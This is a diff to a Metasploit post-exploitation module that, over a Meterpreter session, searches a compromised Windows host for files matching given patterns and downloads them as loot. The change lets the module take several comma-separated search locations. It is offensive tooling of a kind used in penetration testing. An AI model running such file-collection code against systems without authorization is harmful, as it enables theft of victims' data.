@@ -75,7 +75,7 @@ class MetasploitModule < Msf::Post
       filename = "#{file['path']}\\#{file['name']}"
       data = read_file(filename)
       print_status("Downloading #{file['path']}\\#{file['name']}")
-      p = store_loot("host.files", 'application/octet-stream', session, data, file['name'], filename)
+      p = store_loot("host.files", 'application/octet-stream', session, data, file['name'], filename, nil, true)
       print_good("#{file['name']} saved as: #{p}")
     end
   end
@@ -83,36 +83,38 @@ class MetasploitModule < Msf::Post
 
   def run
     # When the location is set, make sure we have a valid path format
-    location = datastore['SEARCH_FROM']
-    if location and location !~ /^([a-z])\:[\\|\/].*/i
-      print_error("Invalid SEARCH_FROM option: #{location}")
-      return
-    end
+    location = datastore['SEARCH_FROM'].split(",").each do |location|
+      location = location.strip
+      if location and location !~ /^([a-z])\:[\\|\/].*/i
+        print_error("Invalid SEARCH_FROM option: #{location}")
+        return
+      end
 
-    # When the location option is set, make sure we have a valid drive letter
-    my_drive = $1
-    drives = get_drives
-    if location and not drives.include?(my_drive)
-      print_error("#{my_drive} drive is not available, please try: #{drives.inspect}")
-      return
-    end
+      # When the location option is set, make sure we have a valid drive letter
+      my_drive = $1
+      drives = get_drives
+      if location and not drives.include?(my_drive)
+        print_error("#{my_drive} drive is not available, please try: #{drives.inspect}")
+        return
+      end
 
-    datastore['FILE_GLOBS'].split(",").each do |glob|
-      begin
-        download_files(location, glob.strip)
-      rescue ::Rex::Post::Meterpreter::RequestError => e
-        if e.message =~ /The device is not ready/
-          print_error("#{my_drive} drive is not ready")
-          next
-        elsif e.message =~ /The system cannot find the path specified/
-          print_error("Path does not exist")
-          next
-        else
-          raise e
+      datastore['FILE_GLOBS'].split(",").each do |glob|
+        begin
+          download_files(location, glob.strip)
+        rescue ::Rex::Post::Meterpreter::RequestError => e
+          if e.message =~ /The device is not ready/
+            print_error("#{my_drive} drive is not ready")
+            next
+          elsif e.message =~ /The system cannot find the path specified/
+            print_error("Path does not exist")
+            next
+          else
+            raise e
+          end
         end
       end
-    end
 
-    print_status("Done!")
+      print_status("Done at the #{location}!")
+    end
   end
 end
